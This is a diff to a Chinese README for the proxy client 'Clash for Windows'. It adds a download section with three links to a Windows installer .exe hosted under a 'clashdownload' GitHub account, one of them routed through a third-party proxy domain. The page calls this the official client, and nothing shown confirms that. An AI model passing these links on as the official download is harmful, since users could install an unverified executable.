@@ -1,11 +1,19 @@
 # Clash for Windows
 
-[Clash for Windows](https://github.com/clashdownload/Clash_for_Windows/releases/download/0.20.39/Clash.for.Windows.Setup.0.20.39.exe) 是 Clash 在 Windows 系统上的官方图形客户端，支持 Windows、Linux、macOS 三大系统，支持多种代理协议（SS、SSR、Socks、Snell、V2Ray、Trojan 等）。
+[Clash for Windows](https://github.com/clashdownload/Clash_for_Windows) 是 Clash 在 Windows 系统上的官方图形客户端，支持 Windows、Linux、macOS 三大系统，支持多种代理协议（SS、SSR、Socks、Snell、V2Ray、Trojan 等）。
 
 ## 系统要求
 
 - Windows XP 及以上（64-bit）
 - Windows PC / Tablet
+
+## 下载地址
+
+[下载地址1](https://github.com/clashdownload/Clash_for_Windows/releases/download/0.20.39/Clash.for.Windows.Setup.0.20.39.exe)
+
+[下载地址2](https://gh.xxooo.cf/https://github.com/clashdownload/Clash_for_Windows/releases/download/0.20.39/Clash.for.Windows.Setup.0.20.39.exe)
+
+[下载地址3](https://github.com/clashdownload/Clash_for_Windows/releases/download/0.20.39/Clash.for.Windows.Setup.0.20.39.exe)
 
 ## ⚠️ 首次运行提示
 >
